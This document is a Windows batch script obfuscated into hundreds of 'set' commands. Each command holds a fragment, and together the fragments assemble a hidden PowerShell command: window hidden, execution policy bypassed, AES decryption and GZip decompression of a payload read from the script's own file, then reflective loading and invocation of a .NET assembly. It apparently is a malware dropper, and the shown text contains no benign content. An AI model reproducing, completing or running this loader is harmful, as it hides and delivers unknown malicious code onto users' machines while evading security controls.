@echo off
set "LUJoVbBvvM=:\"
set "sgWPIjSpqZ=st"
set "MtIWeTEnic=0\"
set "GpiByhpFvq=\W"
set "AyVvtUQBNc=ws"
set "VmqnzyJvzG=nd"
set "ZsLfRqJUlG=.e"
set "doBJjVXbdx=Wi"
set "gDrPPwMNMv=y "
set "nmueAPSadT=s\"
set "UcjcSyDwPx=Sy"
set "oOQYJuLcGn=\v"
set "klomsUfUTP=rs"
set "kNrpGkFbuV=xe"
set "VrGZmnOBCe=ll"
set "BXhDApHlfv=po"
set "PyTDLxDbGw=he"
set "bMBlooGcKP=we"
set "IzFgtZTmBc=we"
set "XDJdJVZXSj=in"
set "jZcmkJRlNJ=em"
set "GrJfRJOqeH=do"
set "evmUSOIQQD=py"
set "KzunFNXKhf=ll"
set "tmQwLcZoWQ=Po"
set "FIsFLbJtuU=32"
set "SsInxhgVZe=co"
set "duJmORdmzN= C"
set "wSFfhTEoaf= /"
set "vKFhMDCMvU=1."
set "eyjPPtBmtO=he"
set "tZBOQyHoJP=rS"
set "dTvmtjLXYR=ow"
set "xhzTfhMZdx=cd"
set "yWHgjKuRzr= %~dp0"
set "PKrMdIepNU=ddin"
set "KhFCXZokCN=zHhH"
set "fHvFcoEQeV=ARO."
set "qfmNatgXBN=ionM"
set "QpPevNYxpo=.Sec"
set "dPDlUKxVIo=stem"
set "FNyBwqYmcO=ObAR"
set "ZLyfbjOkSh=gnir"
set "wYIZSehwFo='[-1"
set "GHxZXvTdcf=ptog"
set "bhNmpCxnos= [st"
set "XlfPTKSFQa=$YrJ"
set "JPulOgYGjl=)) {"
set "MfXJfVusnI=bjec"
set "UBnRuvLRtx=tsWi"
set "MNdkIGqLgu=106u"
set "WHqIPezqyX=.-16"
set "lRPTjXOajV=Comp"
set "hSUvGWYlxj=Invo"
set "xeoZzhxXks=gth)"
set "LoWswnhkvH= = ["
set "TKftJSRwst=y) {"
set "htrZlQvIYm=pStr"
set "GnReytucxp=);$D"
set "AkkRRYzWnO=sion"
set "ntaiNqNqSR=]::("
set "iSFpWBisHu=TT.T"
set "MzfFFddtpl=Obje"
set "lPXiOPcVmg=join"
set "WfmbgnSThy=Syst"
set "tKoocnXbtc=oHqS"
set "VRdtwbdZJn=le  "
set "CXLNpyfQSJ=$OPi"
set "ACIRGwgjVS=lit("
set "NKVfkghGkf=TllA"
set "hBxiGQCaCS=ptor"
set "XsndCUsRvn=dj0C"
set "JAnQrjWWIc=ert]"
set "zxziwrQDGo=, $Y"
set "IONPiGqMIP=[Sys"
set "BulpDvgUrU=m.Re"
set "RzjYVLHzBd=jBNo"
set "WjDpJvLoPx=stem"
set "OxqVbunpFh=VxAf"
set "VZtyLMXWnZ=BC;$"
set "axripjByMv=ress"
set "kCTFBpzcru=S46e"
set "mfqeVezjvT=jjBN"
set "xvHtVGCqkP=;$Ob"
set "IoYrrUtFgn=l5E7"
set "zqGBnCJycl=sy ="
set "lgptoppnhz=Obje"
set "sCnsAxgCZC=('Tg"
set "vmDdeQCjsT=Star"
set "xogrhiLGoJ=VxAf"
set "xYJyvclMPK= [Sy"
set "kZRaslEUZZ=::('"
set "nlNUgkfaxn=New-"
set "RxgfbuAYwD=raph"
set "lYPPbVbUoy=m.IO"
set "ETswxPLEDN=tion"
set "qSAkXSfphZ=raph"
set "zzRVpnhhnA=fore"
set "ZLaWRQsQbH= '')"
set "DpcKOdyAwm=.GZi"
set "uokRwicAHH=eMVs"
set "EizFfXbiOh=morF"
set "aHeNNBlDqy=[Env"
set "EVonXVPQCx=embl"
set "HsywfGlesu=();$"
set "DWGmyZpQGQ=.Con"
set "IhjXjwPRTE== $n"
set "lUegCDdqLk=Mr.T"
set "LPgHTPOfdq=yste"
set "nfOsMKfCSb=oHqS"
set "yZfOPiLyno=zuZI"
set "rNzYnDKrjH=tS46"
set "YmUNvuOSKf=qjVV"
set "OyNfrXhZCc=]::C"
set "NPJskbhGBj=VxAf"
set "TxCkggtrBJ=[]] "
set "dXppOPAkvc=n ''"
set "NdwVfJdHxx=);$u"
set "WgFMzYKlUs=iron"
set "FTMMOlyFwm=F'[-"
set "MziIckTYDO=jJTT"
set "eCQYaJcQsG=k; }"
set "DzTKrPOckN=d;$n"
set "iGZxmYKHgu=RmAx"
set "mTFULiJlMF=();$"
set "EFjvqumfeW=[Sys"
set "gClvNzSZgT=ose("
set "mngPLidpaB=onve"
set "HetdfHonUP=am;$"
set "piPOXrIAAB=$ujJ"
set "ZpFqVsWLmm=$aZi"
set "rynzMrpmEQ=se()"
set "LLZVgjVOpq= = $"
set "FuRYCjcyFf=Conv"
set "CvakLUSOri=16] "
set "nBLeifdBIc=lBlo"
set "GZLkevlsAv=Comp"
set "fRumOuYbNO=gsYZ"
set "vjxicrRZOt=ptog"
set "dIeQJGuDtC=();$"
set "SAnrgfLFwF=gjYA"
set "JbbbBPyDyv= if "
set "yFMgqpABFV=oint"
set "APHjOdJgVE= = $"
set "ksjQRrRwoN=N = "
set "tFBosZdgka=stem"
set "EEEjBDbSDJ=.Cop"
set "KEMhktzjZP=.Ass"
set "xuyqhAbMMu=ment"
set "WzlnrgSkGa=RO, "
set "dKxgDkHbyD=e]::"
set "GgbjdIEezB=oL'["
set "xvMGzHPHiW= [Sy"
set "BLsOzJEble=m.En"
set "uAoQAWCHND=::De"
set "WPTXHwJIdK=:('g"
set "AnKsrOFzUw=..-1"
set "ycQsAQQvme=);$j"
set "gMljsaslwx=;$Dd"
set "XyoinjbNxV=$nVx"
set "IjdAVoKwld=rity"
set "RBxPlfZLsX=rity"
set "eSIfTvaIzy=pres"
set "pPpazPqDss=] -j"
set "VploDDtPKm=rofi"
set "AhRgyBSKOB=ect "
set "wFKkhJPHDg=pose"
set "hhrmypwjJo=.Cry"
set "hMgbtSCOkT=KN ="
set "YRFiurkVlZ=.Cre"
set "xlDMDhlJnE=PTtG"
set "AxlYkCAmbg= New"
set "oZlWWgFEDK=[Sys"
set "oTpGUuonlh=('%*'"
set "jIZxzZWmbA=]::N"
set "QFGLFyLGER=PxEW"
set "acQjGOJava=.Key"
set "EWgHKfyJQs=YrJK"
set "sAgkZbGeyl=oryS"
set "VQYJiTjQNF=Syst"
set "QRzwnRdRbQ=ress"
set "MWSLSNcyMG=-ep "
set "ZUbghhrNpC=-1.."
set "mPHTOtWVrH=ewLi"
set "oVdBawgleO=;$aZ"
set "qrTruDwgHy=-Obj"
set "jDqYmUxHQX=TT);"
set "EDzrSGgLAE=tem."
set "ruOYhukLNJ=$ujJ"
set "vLdBLwASNO='[-1"
set "fKdRQrygor= '')"
set "QuIFrRpXhl='txe"
set "IhJSVZXfAZ=ck($"
set "AgNPsRdDzi='')("
set "oWwcupZhZI=KN);"
set "JPyAlztjiB=mory"
set "LvSaIHIDEk=; };"
set "JMLdBqxzPm=eam("
set "ZIwmjmmRGM=t Sy"
set "FUDlyemySA=hRC."
set "PwEjqBOzhz='gni"
set "dSgiTRoixy=Secu"
set "SDxgwwlHOz=YrJK"
set "GtLpwZGUMg=.Len"
set "vhATCTsAlr=O = "
set "nqfgACxVXG=..-1"
set "yWnjjopMPH=fWdI"
set "CcAAKEcBIm=null"
set "aMDYlTzfnW=bypa"
set "dbJfOoRPCw=, (,"
set "KCrDkZtmLP=('da"
set "PfzKOZggjg=$YrJ"
set "VwqlbFvvvE=New-"
set "AVcemineiC=and "
set "cKDtRpSVqA=('%~f0'"
set "XnQcSjnLRl=ss -"
set "vnmOHtfCLN=VxAf"
set "WpXOLLkaBg=nage"
set "VAKlafzQKV=ress"
set "oPBrlqtcRf=grap"
set "SVhukUfIjt= = N"
set "XdPBWUQPdt=rt]:"
set "PYlZbuvNyF=.Mem"
set "zPbWfDnnrn=File"
set "txcfVZwAvP=comm"
set "uHuglJbmkd=Mode"
set "oZWZGmbdIl=gMod"
set "HlgZkFDQGq=esaB"
set "HOYNjqSFjy=ing("
set "gOnpSIGMhJ=)))"
set "dDRYGppKvV=L4Yi"
set "FUmdITKPct=rans"
set "oWtijNMVWc=.Mod"
set "arXNaPqxly=Secu"
set "fUtKNutTlg=vert"
set "IGXjyWOPea=)($Y"
set "qacOJCvZSC=.Dis"
set "LUpDvGjNGn=ne);"
set "xmSOJrMhUH=ion."
set "mCFXuVgRMu=ecry"
set "EtQOSbbwzn===')"
set "HRZTKsrgbE=YxVw"
set "BupapVFVoU=dhRC"
set "AMsNxWBLPu=y.Cr"
set "kzXnMCkSJu=]::("
set "NLyCkLQFhB== [S"
set "QJEPrPVygn=o = "
set "iLiZzPPYrP=$ObA"
set "QRVJUrUTsH=  $h"
set "uuvWXesuLc=ring"
set "wZIxOfnljS=VxAf"
set "JhvbSZTkOB=oArr"
set "jNvQDiAAAG=V = "
set "VtzfitWnvs=[-1."
set "RwbahuzZGW=ay()"
set "CCeNQABdVk=-joi"
set "bjLLDVDmHx=yste"
set "IeORHJulBb=m.IO"
set "DguVifpbYI=flec"
set "cnOUxYADMp=ct S"
set "QiVezBKkfH=oin "
set "qmXZGCYhke=form"
set "VkBvJydqIS=y.Pa"
set "avOhKbkMVR=bstr"
set "LVQAQmTCPB=Disp"
set "jcwpsMxioD=-joi"
set "AHrGkHIvNd=.Com"
set "oKTahtZEul=yste"
set "FtXmGuguxv=n ''"
set "HmyDGBIohO=dIm."
set "JzfsEbtzBS=;$aZ"
set "dtUdCOLmin=s75K"
set "FIAOgPBSQB=N, 0"
set "uGscECxjOo=Stre"
set "dTbBZxQoqH=rJKN"
set "BCDclWhFoN=join"
set "TGIMqkoAQJ=.IO."
set "qurMOFCAum=1..-"
set "oODyuJZxpX=nirt"
set "gPOhJkTBaT=)($h"
set "GZlgrVTNLk=CFxo"
set "zzvCnpocoo=Fina"
set "spEopLZsGW=em.C"
set "EgueIptwcT=($fW"
set "UMBAEvoWvy=ddin"
set "hyWCkAFAZZ=daeR"
set "mOIRGnJVwN=in $"
set "RNDjtvyzYz=;$qj"
set "SDkTIseMma=OPis"
set "SUavVVnWXp=tryP"
set "CQYafRDYiy=[IO."
set "GXEBCioTTp=6] -"
set "ihfNJsxgvQ=1] -"
set "RWwYrgEcSP=comp"
set "qKrlfcELdY=-4] "
set "FyZoamYNeI=($fW"
set "kniUCTiLRE=iMr "
set "OxgmbIqjtm=Bmor"
set "cHHRDcifyh=brea"
set "GUwrDNaIlC=YrJK"
set "OXSDkhTmTh=$jjB"
set "GCnZSIcPRO=y]::"
set "DDwDUXEyak=.Dis"
set "QjGNbMYLDA=dIm "
set "umuxKHVmec=$ujJ"
set "eCoGeiZFfz=.Cry"
set "JAOyRKqOvL==');"
set "yaDCWDacyd=m.Su"
set "byktgHNFCN=ach "
set "WJzxwVAUKE=y.Ci"
set "PfrZwwfVXx=Af.I"
set "ToJGPVruRU=f.Pa"
set "OPCnKVnCPx=7;$n"
set "SpFUEBphji=ateD"
set "vtNkDzlfmk=3); "
